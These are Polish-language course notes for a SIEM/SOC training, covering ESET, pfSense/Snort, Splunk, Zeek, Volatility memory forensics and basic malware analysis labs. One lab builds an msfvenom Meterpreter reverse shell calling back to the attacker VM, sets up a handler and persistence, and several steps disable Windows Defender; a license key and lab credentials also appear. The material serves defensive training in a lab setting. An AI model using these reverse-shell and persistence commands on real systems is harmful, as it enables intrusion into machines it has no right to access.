ðŸ“… 22.10.2022 ðŸ•˜ [09:00]

WykÅ‚adowca: Kamil KamiÅ„ski

Global SIEM & SOC

Chapter 1 SIEM & SOC Introduction and PC Protection & ESET
= - = - = - = - = - = - = - = - = - = - = - = - = - = - = 

â„¹ï¸ Przerwy: 

10:30 - 11:00
13:00 - 13:45
15:00 - 15:15

---

[SIEM & SOC Introduction]

ðŸ’¡-- Definicje

SOC - Security Operations Center
https://en.wikipedia.org/wiki/Information_security_operations_center

NOC - Network operations center
https://en.wikipedia.org/wiki/Network_operations_center

SIEM - Security Information and Event Management
https://en.wikipedia.org/wiki/Security_information_and_event_management

CSIRT - Computer Security Incident Response Team
https://www.techslang.com/definition/what-is-a-computer-security-incident-response-team-csirt/

PSIRT - Product Security Incident Response Team
CERT - Computer Emergency Response Team
MSSP - Managed Security Service Provider

ðŸ”— â€“ SOC vs. CSIRT: Whatâ€™s the Difference?
https://www.criticalstart.com/soc-vs-csirt-whats-the-difference/

***

### ðŸ“‹ -- Lab01 TMS Workflow

Rejestracja konta na Trello https://trello.com/en/signup

    Utworzenie nowej Tablicy (SOC Incident Response)

    Nowa Lista

    Nowy Task


***

[PC Protection & ESET]

ðŸ”— -- ciekawe artykuÅ‚y
https://www.youtube.com/watch?v=Zy4G30kSPnY
https://www.nao.org.uk/wp-content/uploads/2017/10/Investigation-WannaCry-cyber-attack-and-the-NHS.pdf
https://www.trellix.com/en-us/security-awareness/ransomware/what-is-stuxnet.html
https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/WannaCry-Aftershock.pdf

### ðŸ“‹ -- Lab02 ESMC & Agents

NaleÅ¼y uruchomiÄ‡ 2 maszyny: Windows 2016 z AD i Windows10 (podÅ‚Ä…czony do AD)
SieÄ‡ Nat Network

na Windows 2016:
naleÅ¼y zainstalowaÄ‡ .NET 
    add roles robimy next next
    na features na .net 3.5
    install
Inatalacja java:
    https://www.java.com/pl/download/manual.jsp
Instalacja Systemu ESET:
    https://www.eset.com/us/business/security-management-center/download/
    Instalacja eseta,
    wypakowanie,
    setup run,
    next, next, accept, java klikamy,install,
    next, next, next  i podajemy haslo admina do bazy danych, 
    klucz lcencji: JJRW-XMXA-G6JR-4V4K-2W9M

ðŸŽžï¸ -- Film instruktaÅ¼owy o instalowaniu ESMC:
https://www.youtube.com/watch?v=RAQlaNabuaw

Aby siÄ™ zalogowaÄ‡:
https://ip_servera2016/era
    po zaladowaniu powinnnismy widziec dashboard, 1 urzadzenie windows server,
    installer
    create installer (wyklikaÄ‡ opcjÄ™)
    AllinOne
    finish
    download64

ðŸ”— -- Link do instalatora w wersji standalone:
https://www.eset.com/us/business/security-management-center/download/#standalone


ðŸ”— -- Instrukcja jak zainstalowaÄ‡ ESMC:jak aktywowaÄ‡ ESMC:
https://support.eset.com/en/kb7709-install-eset-protect
ðŸ”— -- Instrukcja jak aktywowaÄ‡ ESMC:jak aktywowaÄ‡ ESMC:
https://support.eset.com/en/kb7735-activate-eset-business-products-using-eset-protect
ðŸ”— -- Instrukcja jak instalowaÄ‡ agenta:
https://support.eset.com/en/kb7649-add-client-computers-in-eset-protect
ðŸ”— -- Instrukcja jak instalowaÄ‡ Eset Protect na stacji:
https://support.eset.com/en/kb7705-configure-eset-protect-to-automatically-deploy-eset-endpoint-products-to-unprotected-computers

### ðŸ“‹ -- Lab03 Tasks & Groups

ðŸ”— -- Instrukcja jak stworzyÄ‡ zadanie (task):
https://support.eset.com/en/kb7816-create-a-trigger-and-add-target-computers-or-groups-to-execute-a-client-task-in-eset-protect
ðŸ”— -- Instrukcja jak stworzyÄ‡ grupÄ™ dynamicznÄ…:
https://support.eset.com/en/kb7820-create-dynamic-group-templates-in-eset-protect

### ðŸ“‹ -- Lab04 Policies & Reports

ðŸ”— -- Tworzenie nowych polityk:
https://support.eset.com/en/kb7824-create-a-new-policy-in-eset-protect
ðŸ”— -- generownaie raportÃ³w:
https://support.eset.com/en/kb7817-generate-a-report-in-eset-protect

***

ðŸ“… 23.10.2022 ðŸ•˜ [09:00]

Chapter 2 Network Protection & Prevention and Log Generation & Collection
= - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - =

[Network Protection and Prevention]

ðŸ”— -- Osint Framework
https://osintframework.com/

ðŸ”— -- WAF
https://sekurak.pl/czym-jest-web-application-firewall-czesc-pierwsza-na-przykladzie-naxsi/


### ðŸ“‹ -- Lab01 pfSense Installation

ðŸ”— -- link do instalatora:
https://ln2.sync.com/dl/45d0e2af0/hcp6svjx-n5qfxuvu-c727y2fs-22kg5gzz/view/default/9716616360007

Dodajemy jÄ… jako nowÄ… maszyne w VB, typ maszyny BSD 64b

#pfSense konfig:
pfSense - ustawiamy dwa VM interfejsy (NAT i Internal Network -w obu tryb nasÅ‚uchowania)
Windows10 - Internal Network (ten sam co w pfSense)
Kali - Internal Network (ten sam co w pfSense)


Kali
pfSense z przeglÄ…darki https://192.168.1.1/
ðŸ”‘ â€“ admin:pfsense

    Dodajemy w Primary DNS Server: 8.8.8.8

    W konsoli pfSense wybieramy System -> Update


***

### ðŸ“‹ -- Lab02 Snort Installation

System > Package Manager > Available Packages
 > Search: snort > Install
 

    ZakÅ‚adamy konto na snort: https://www.snort.org/users/sign_in

    Po zalogowaniu kopiujemy Oinkcode do pfSense: Services > Snort > Global Settings

    Zaznaczamy Enable Snort VRT + Enable Snort GPLv2 + Enable ET Open > Save

    Services > Snort > Interfaces: Enable > LAN + wybieramy Send Alerts to System Log + Block Offenders > Save

    Services > Snort > Update > Updates Rules

    Services > Snort > Snort Interfaces: Edycja LAN > LAN Categories i wybieramy reguÅ‚y:

    emerging-exploit.rules

    emerging.icmp-rules

    emerging-malware-rules

    > Save

    Services > Snort > Update > Updates Rules


***

### ðŸ“‹ -- Lab03 Custom Rules

    Utworzenie nowej reguÅ‚y: Snort Interfaces > LAN Rules > Category Selection: custom.rules

    Rule: 

    alert tcp any any -> $HOME_NET any (msg:"TCP Port Scanning"; detection_filter:track by_src, count 30, seconds 60; sid:1000006; rev:2;)

    Services > Snort > Update > Updates Rules

    Services > Snort > Interfaces > LAN (Play)


Ping z Kali do pfSense (192.168.1.1) wyzwala alerty w Snort:

    ping 192.168.1.1


Skanowanie Win10 (192.168.1.100) przez nmap z Kali (192.168.1.101):
pfSense nie widzi tego ruchu, poniewaÅ¼ jest to Å›rodowisko w VirtualBox


    nmap -sV -A 192.168.1.100


Zablokowanie protokoÅ‚u ICMP

    Firewall > Rules > Edit:

    Action: Block

    Interface: LAN

    Address Family: IPv4

    Protocol: ICMP


***

[Log Generation & Collection]

WEF - Windows Event Forwarding
https://social.technet.microsoft.com/wiki/contents/articles/33895.windows-event-forwarding-survival-guide.aspx

WEC - Windows Event Collector
https://learn.microsoft.com/en-us/windows/win32/wec/windows-event-collector


### ðŸ“‹ -- Lab04 Windows WEF

Setup: Obie maszyny w sieci np. Internal Network, Server | Client
    1. Windows Server 2016
    2. Windows 10

Windows Server (DC) cmd.exe `Run as Administrator`

    winrm qc

    wecutil qc


Windows 10 powershell `Run as Administrator`

    Get-NetConnectionProfile

    Set-NetConnectionProfile -InterfaceIndex 4 -NetworkCategory Private


 cmd.exe `Run as Administrator`

    winrm qc

    wecutil qc


Windows Server (DC) powershell `Run as Administrator`

    Enable-PSRemoting


Windows 10 powershell `Run as Administrator`

    Enable-PSRemoting

    Enable-PSRemoting -SkipNetworkProfileCheck -Force


Dodanie uÅ¼ytkownika w Win10
Computer Management> System Tools > Local Users and Groups > Groups > Event Log Readers

    Dodajemy > NETWORK.SERVICE

    Dodajemy > WINSERV2016AD


Windows Server 2016

    Event Viewer

    Nowa Subskrypcja (Subscriptions) - prawy klawisz myszy > Create Subscription > Win10 LAB logs > Select Computer > WIN10 (nazwa komputera)

    Test (sprawdzenie poÅ‚Ä…czenia)


*** 

ðŸ’¡-- Notatki prowadzÄ…cego

THREATS -> exploits -> VULNERABILITIES -> which results in -> EXPOSURE -> which is -> RISK -> which is mitigated -> SAFEGUARD -> which protect -> ASSET 

â€”â€”â€”â€”â€”â€”â€” 
NSM:

- Session data: 5-tuple - source IP address, source port, destination IP address, destination port, timestamp 
- Full packet capture: PCAP  
- Transaction data: for example HTTP, SMTP transactions
- Alert data: IPS, firewall, WAF, DLP 
- Statistical data: baselines
- Metadata: data about data

Chain of custody 
DMZ 
Zero trust

CSIRT:
Product Security Incident Response Team (PSIRT)
National CSIRT and Computer Emergency Response Team (CERT) 
Managed Security Service Provider (MSSP)
â€”â€”â€”â€”
Antywirusy
Sygnatury hashowe 
Sygnatury bajtowe
Sygnatury heurystyczne
â€”â€”â€”â€”
IDS - Intrusion Detection System
HIDS - Host Intrusion Detection System
NIDS - Network Intrusion Detection System
â€”â€”â€”â€”
IPS - Intrusion Prevention System
HIPS - Host Intrusion Prevention System
NIPS - Network Intrusion Prevention System
â€”â€”â€”â€”
HOST W LAN <-> FIREWALL (80,443) > DMZ < FIREWALL (25, 80, 443, 445) <> INTERNET
HOST W LAN <-> PROXY HTTP/S (odszyfrowanie ruchu) <-> INTERNET

pfSense konfig:
pfSense interfejsy: 1. sieÄ‡ NAT, 2. internal network (w obu ustawiamy tryb nasÅ‚uchiwania)
Win10 interfejsy: 1. Internal network (ten sam co pfsense)
Kali interfejsy: 1. internal network (ten sam co pfsense)

VirtualBox <WAN> pfSense <LAN> win10 <LAN> kali

login: admin pass: pfsense

***

ðŸ“… 29.10.2022 ðŸ•˜ [09:00]

### ðŸ“‹ â€“ Lab05 Event Forwarding

Kali - Terminal as `root`

    service rsyslog status

    service rsyslog start

    nano /etc/rsyslog.conf

    #1. pod sekcjÄ… #### MODULES #### https://pastebin.com/3znkK1uH

    $template Incoming-logs,"var/log/pfsense/pfsense.log" 

    *.* ?Incoming-logs 

    & ~

    #2. odkomentowaÄ‡ 2 linie

    module(load="imudp")

    input(type="imudp" port="514")


    service rsyslog restart

    netstat -tulpn


***

### ðŸ“‹ â€“ Lab06 Snort Logs to Syslog

pfsense

    Status > System Logs > Settings > Send log messeges to remote syslog server

    Remote log servers: 192.168.1.101:514 <IP Kali>

    Remote Syslog Contents: [X] Everything

    Services > Snort > Update > Updates Rules


Kali

    less /var/log/pfsense/pfsense.log


***

Global SIEM & SOC

Chapter 3 SIEM Solutions and IOC & Malwares
= - = - = - = - = - = - = - = - = - = - = -

[SIEM Solutions]

ðŸ’¡-- Pliki instalacyjne Splunk:
https://hackeru-my.sharepoint.com/:u:/p/kamilk/Eb2wSdUS4RuXbb9K9OGBPMsB65Rm3b_eKa5QayyLUjrTeQ?e=psZz5t

https://ln.sync.com/dl/2d11924a0/6ymfkb58-f33kd44u-6jru76b7-32ynqvxv/view/default/9873107940007



ðŸ”— -- True vs. False and Positive vs. Negative
https://developers.google.com/machine-learning/crash-course/classification/true-false-positive-negative


### ðŸ“‹ â€“ Lab01 Splunk Enterprise Installation

Kali i Windows10 ustawione na NatNetwork - ta sama sieÄ‡
chmod +x splunk-8.0.6-linux-2.6-amd64.deb
dpkg -i splunk-8.0.6-linux-2.6-amd64.deb
cd /opt/splunk/bin
./splunk enable boot-start
service splunk start

#reinstalacja splunk:
dpkg -r splunk
cd /opt/splunk/bin
./splunk enable boot-start
service splunk start

/var/log
host="dey" source="/var/log/*" authentication 

### ðŸ“‹ â€“ Lab02 Splunk Universal Forwarder

#Link do do agenta:
https://hackeru-my.sharepoint.com/:u:/p/kamilk/Eb2wSdUS4RuXbb9K9OGBPMsB65Rm3b_eKa5QayyLUjrTeQ?e=psZz5t

#Odblokwanie portu do komunikacji z Splink - port 9997
w win 10:
windows defender firewall
advanced settings
outbound rule
prawy przycisk -> new rule
port
next
9997
allow the connection
next
name - splunk agent
finish

kali
splunk
settings
forwarding and receiving

win:
splunk forwarder 2x kliknÄ…Ä‡
customize options
username i pass to samo co w splunk - na potrzeby labu
podajemy ip kaliego + ip 8089
next
to samo ip + port 9997 ( z kaliego )
next
install

***

### ðŸ“‹ â€“ Lab03 Creating Event Alerts in Splunk

service ssh status
service ssh start
service ssh status
#z poziomu Windows:
ssh user@IP_addres_Kali
#wpisujemy poprawne hasÅ‚o

#ponownie - kilka razy 
ssh user@IP_addres_Kali
#wpisujemy niepoprawne hasÅ‚o

***

ðŸ”— -- Opis atakÃ³w organizacji Mitre:
https://attack.mitre.org/
ðŸ”— -- Info o wyciekach:
https://wikileaks.org/
ðŸ”— -- Security Onion Solution (SOS)
https://securityonionsolutions.com/software

### ðŸ“‹ â€“ Lab04 Zeek Installation

apt update
sudo apt-get install libssl-dev git cmake make gcc g++ flex bison libpcap-dev python2-dev swig zlib1g-dev
git clone --recursive https://github.com/zeek/zeek
cd zeek
sudo su
./configure
make
make install
export PATH="/usr/local/zeek/bin:$PATH"

zeekctl
install
start
status


***

### ðŸ“‹ â€“ Lab05 PCAP File Investigation

ðŸ”— -- Download general-AlFTM-2021.01.24.12.49.22-infected.rar
https://beyond.hackampus.com/canvas/general/general-AlFTM-2021.01.24.12.49.22-infected.rar

    Rozpakowanie pliku

unrar e general-AlFTM-2021.01.24.12.49.22-infected.rar

    WyciÄ…gniÄ™cie danych z infected.pcap

    zeek -Cr infected.pcap


    Analiza logÃ³w dhcp

    cat dhcp.log

    cat dhcp.log | zeek-cut mac client_addr host_name


    Analiza logÃ³w kerberos

    cat kerberos.log

    cat kerberos.log | zeek-cut id.orig_h client service | awk '$3~"krbtgt"' | grep nalyvaiko-pc


    Analiza logÃ³w files

    cat files.log

    cat files.log | zeek-cut mime_type filename | grep msword


    Analiza logÃ³w http

    cat http.log

    cat http.log | zeek-cut -d  ts method host uri resp_filenames resp_mime_types | grep msword


    Weryfikacja plikÃ³w w Virus Total

    https://www.virustotal.com/gui/file/f47f72f78711d3e125d5b81d5f433475a6c749aa724e19e25377ee3e83ff4a6c/details




***

ðŸ“… 30.10.2022 ðŸ•˜ [09:00]

Chapter 4 Windows Live & Offline Analysis and Memory Analysis
= - = - = - = - = - = - = - = - = - = - = - = - = - = - = - =

[Windows Live & Offline Analysis]

### ðŸ“‹ -- Lab01 DNS Cache

NaleÅ¼y zainstalowaÄ‡ 2 przeglÄ…darki Chrome i Firefox na Windows 10 (sieÄ‡ Nat Network).

    Chrome > yahoo.com > Tryb Incognito > nytimes.com

    Firefox > duckduckgo.com > Nowe okno prywatne > thehackernews.com

    CzyÅ›cimy historiÄ™ przeglÄ…darki Chrome: Ustawienia > PrywatonoÅ›Ä‡ i bezpieczeÅ„stwo > WyczyÅ›Ä‡ dane przeglÄ…dania

    CzyÅ›cimy historiÄ™ przeglÄ…darki Firefox: History > Clear Recent History

    cmd

    ipconfig /displaydns

    ipconfig /displaydns > "C:\Users\winlab\Desktop\cache.txt"


***

2FA - uwierzytelninie dwuskÅ‚adnikowe:
coÅ› co wiemy -> login, hasÅ‚o, kod PIN
coÅ› co mamy -> google auth, appka mobilna, token, telefon SMS
coÅ› czym jesteÅ›my -> faceid, skaner palca, retina scan, skan tÄ™czÃ³wki 
coÅ› gdzie jesteÅ›my -> geolokalizacja, geofencing

***

### ðŸ“‹ â€“ Lab02 Prefetch Investigation

Windows 10

    ðŸ”— -- Instalacja AnyDesk https://anydesk.com/en/downloads/windows

    Odinstalowanie AnyDesk

    C:\Windows\Prefetch

    pozostaÅ‚y pliki AnyDesk.EXE[...].pf

    ðŸ”— -- Download WinPrefetchView v1.37 https://www.nirsoft.net/utils/winprefetchview-x64.zip


***

ðŸ”— -- Computer Security Incident Handling Guide
https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final

ðŸ”— -- Computer Security Incident Handling Guide PDF
https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf

***

### ðŸ“‹ â€“ Lab03 VM Investigation

ðŸ”— -- Windows Live & Offline Analysis.ova - 3.7 GB
https://ln2.sync.com/dl/3d40053a0/fm63kjds-zszhtpb3-8yf35m6h-7w4en6i7

Przy imporcie ova:

    UsunÄ…Ä‡ kontroler USB

    Generate new MAC addressess


ðŸ”‘ credentials
client:Pa$$w0rd

Uruchomienie Chrome w jÄ™zyku angielskim

    Win+R

    chrome --lang=EN


ðŸ”— -- USBDeview v3.06
https://www.nirsoft.net/utils/usbdeview-x64.zip

ðŸ”— -- WinPrefetchView v1.37
https://www.nirsoft.net/utils/winprefetchview-x64.zip

# Weryfikacja DNS cache

    ipconfig /displaydns > Desktop\cache.txt


# Rejestr

    regedit

    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

    HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted


ðŸ”— -- MyLastSearch v1.65
https://www.nirsoft.net/utils/mylastsearch.zip

***

[Memory Analysis]

### ðŸ“‹ â€“ Lab04 Memory Identification

ðŸ”— --  SIFT-Workstation.ova - 4.7 GB
https://ln2.sync.com/dl/c8918eaf0/463gj65v-g5uxvnhw-pagzd554-49iwcf38/view/default/9760019580007

ðŸ”‘ SIFT:
SANS forensics:forensics

    ZainstalowaÄ‡ dodatki VBox Guest Addition


ðŸ”— --  Lab - Extra Files.rar - 179.9 MB
https://ln2.sync.com/dl/94ff79a60/jhhvt7nn-ufwvguyu-dmaa9cs7-chfd7vmm/view/default/9812143180007

    Rozpakowanie plikÃ³w:

    unrar e Lab\ -\ Extra\ Files.rar

    unrar e VolpymeL1.rar


    Zbieranie informacji o pliku zrzutu (dump):

    vol.py imageinfo -f VolpymeL1.vmem


    Drzewo procesÃ³w:

    vol.py pstree -f VolpymeL1.vmem --profile=WinXPSP2x86 


***

### ðŸ“‹ â€“ Lab05 Network Investigation

    Zbieranie informacji o pliku zrzutu (dump):

    vol.py imageinfo -f VolpymeL2.vmem


    Lista procesÃ³w

    vol.py pslist -f VolpymeL2.vmem --profile=WinXPSP2x86


    AktywnoÅ›Ä‡ sieciowa

    vol.py connscan -f VolpymeL2.vmem --profile=WinXPSP2x86

    vol.py sockets -f VolpymeL2.vmem --profile=WinXPSP2x86


***

### ðŸ“‹ â€“ Lab06 Process Investigation

    vol.py imageinfo -f VolpymeL3.vmem


    vol.py pslist -f VolpymeL3.vmem --profile=WinXPSP2x86

    vol.py pstree -f VolpymeL3.vmem --profile=WinXPSP2x86


    vol.py connscan-f VolpymeL3.vmem --profile=WinXPSP2x86

    vol.py sockets -f VolpymeL3.vmem --profile=WinXPSP2x86


    Zrzut procesu 856 do plikÃ³w dll

    vol.py dlldump -p 856 --dump-dir /home/sansforensics/Documents/ -f VolpymeL3.vmem --profile=WinXPSP2x86


    Zrzut procesu 856 z wykorzystaniem malfind (poszukiwanie wstrzykniÄ™cia do procesu)

    vol.py malfind -p 856 --dump-dir /home/sansforensics/Documents/ -f VolpymeL3.vmem --profile=WinXPSP2x86


    Sprawdzenie sum kontrolnych

    md5sum process.0x80ff88d8.0xb70000.dmp

    59f1993ae96c0108f0fa224609f51a2f

    md5sum process.0x80ff88d8.0xcb0000.dmp 

    da295c2ce7c8741c2f16ff8d0f76efd3


    VirusTotal > sprawdznenie hashy https://www.virustotal.com/gui/home/search

    https://www.virustotal.com/gui/file/8e3be5dc65aa35d68fd2aba1d3d9bf0f40d5118fe22eb2e6c97c8463bd1f1ba1

    https://www.virustotal.com/gui/file/122ad7e44da2aa468b2c4d6f9821e35d347e1e6204c4e14651fac1da1bdc4a85


ðŸ  Homework

Zeus Trojan - Memory Forensics with Volatility
http://phucnw.blogspot.com/2016/10/zeus-trojan-memory-forensics-with.html


ðŸ’¡-- Notatki prowadzÄ…cego

â€”â€”â€”â€”â€”â€”
False positive 
False negative 
True positive 
True negative 
â€”â€”
CIA: poufnoÅ›Ä‡, integralnoÅ›Ä‡, dostÄ™pnoÅ›Ä‡ 

â€”â€”â€”â€”â€”
IoC: hash, IP, IP+port, domena, hostname, nazwa procesu, wpisy w rejestrze, poÅ‚Ä…czenia sieciowe, plik w autostart, [â€¦]

https://attack.mitre.org/ 

Magic bytes 

Threat hunting, threat intel, threat feed, IoC 

Threat intel -> IoC -> threat hunting

Incident response + forensic 

***

ðŸ“… 05.11.2022 ðŸ•˜ [09:00]

Chapter 5 Basic Static Analysis & Basic Dynamic Analysis
= - = - = - = - = - = - = - = - = - = - = - = - = - = - 

[Basic Static Analysis]

Setup - Flare VM:

    Windows 10 Clone | NAT Network

    flare-vm - https://github.com/mandiant/flare-vm > Code > Download ZIP

    Powershell as Administrator

    cd "C:\Users\<user>\Downloads\flare-vm-master"

    Set-ExecutionPolicy bypass # > [A] Yes to All

    Set-MpPreference -DisableRealtimeMonitoring $true #wyÅ‚Ä…czenie Defendera

    .\install.ps1

    password from user


***

ðŸ”— -- Praktyczna inÅ¼ynieria wsteczna (MiÄ™kka)
https://ksiegarnia.pwn.pl/Praktyczna-inzynieria-wsteczna,622427233,p.html

ðŸ”— -- List of file signatures
https://en.wikipedia.org/wiki/List_of_file_signatures

***

### ðŸ“‹ â€“ Lab01 Malware Types

***

### ðŸ“‹ â€“ Lab02 Strings & Hashes

ðŸ”— -- SOC Extra file.rar - 546.2 KB
https://ln.sync.com/dl/bf8343ac0/pfh3tc8y-zcfgpag2-3546tqj9-6aqw56z8/view/default/9993743600007

ðŸ”‘ â€” Password to extract the file: password

ðŸ”— -- Download WinRAR
https://www.win-rar.com/download.html?&L=0

WyÅ‚Ä…czyÄ‡ Defender'a
Powershell as Administrator:
    Set-MpPreference -DisableRealtimeMonitoring $true

strings

    ðŸ”— -- strings https://learn.microsoft.com/en-us/sysinternals/downloads/strings

    cd "C:\Users\<user>\Downloads\SOC Extra file"


    strings free.exe > analiza.txt


certutil

    ðŸ”— -- certutil 

    https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil

    certutil -hashfile free.exe MD5

    wkleiÄ‡ wygenerowany hash do wyszukiwarki google i sprawdziÄ‡ wyniki.


ðŸ”— --informacje o pe-format

    https://learn.microsoft.com/en-us/windows/win32/debug/pe-format



### ðŸ“‹ â€“ Lab03 Resource Hacker

ðŸ”— --Download Resource Hacker
http://www.angusj.com/resourcehacker/
ðŸ”— -- Download SOC Extra file
https://ln.sync.com/dl/bf8343ac0/pfh3tc8y-zcfgpag2-3546tqj9-6aqw56z8
ðŸ”‘ â€“ hasÅ‚o: password

po wypakowaniu przeciÄ…gamy plik free.exe do programu Resource Hacker i analizujemy

### ðŸ“‹ -- Lab04 D.Walker 

ðŸ”— --Download D.Walker 
https://ln2.sync.com/dl/7d2e8f860/iqzrcst4-qjp767u6-3gm8kxkg-gaiz3xxk
ðŸ”— --Download Dependencies
https://github.com/lucasg/Dependencies/releases/download/v1.11.1/Dependencies_x64_Release.zip
ðŸ”‘ â€“ hasÅ‚o: password

Dependenciesgui.exe
naleÅ¼y zaczytaÄ‡ plik dwalker.exe i przeanalizowaÄ‡.


### ðŸ“‹ -- Lab05 Sysmon

ðŸ”— --Download Sysmon
https://learn.microsoft.com/pl-pl/sysinternals/downloads/sysmon

#instalacja sysmon:
Powershell (uruchomiÄ‡ jako administrator):

sysmon -i 

lub:
cd C:\Users\winlab\Downloads\Sysmon  #przejÅ›Ä‡ do swojego katalogu, gdzie zostaÅ‚ poprany program sysmon
.\Sysmon.exe -i

#Event Viewer:
Application and Services -> Microsoft -> Windows -> Sysmon

ðŸ”— --Download Lab_02.rar 
https://ln2.sync.com/dl/1e555ebb0/qniaxmyq-nex6k6d7-sn75stn3-66zyir88

po wypakowaniu, uruchomiÄ‡ Lab_02.xml
i widzimy np.: Name="ParentCommandLine">"C:\Users\IT\Desktop\Tools\Ransomware.WannaCry


### ðŸ“‹ -- Lab06 Autoruns

ðŸ”— --Download Autoruns
https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
https://download.sysinternals.com/files/Autoruns.zip

Potrzebne sÄ… 2 maszyny Kali i flarevm (sieÄ‡: Nat Network).

#Tworzymy reverse shell:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_Kali LPORT=4444 -f exe > toniejestmalware.exe 

np.:msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.2.142 LPORT=4444 -f exe > toniejestmalware.exe

#Uruchamiamy nasÅ‚uchiwanie
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IP_Kali
set LPORT 4444
exploit

#UdostÄ™pniamy plik - w katalogu, w ktÃ³rym jest nasz plik w malware odpalmy:
python3 -m http.server 9090

#Pobieramy plik na Flare przez przeglÄ…darkÄ™ interentowÄ…:
http://IP_kali:9090/
i uruchomiÄ‡

#w sesji meterpreter:
run persistence -U -i 5 -p 4444 -r IP_Kali

### ðŸ“‹ -- Lab07 Regshot

naleÅ¼y uruchomiÄ‡ regshot i zrobiÄ‡ zrzut:
1st shot
potem zmieniamy coÅ› w rejestrze
2st shot
i porÃ³wnujemy


### ðŸ“‹ -- Lab08 BlackList

Sprawdzamy reputacjÄ™ przzy pomocy:
https://whatismyipaddress.com
https://www.talosintelligence.com
https://www.ipqualityscore.com/free-ip-lookup-proxy-vpn-test




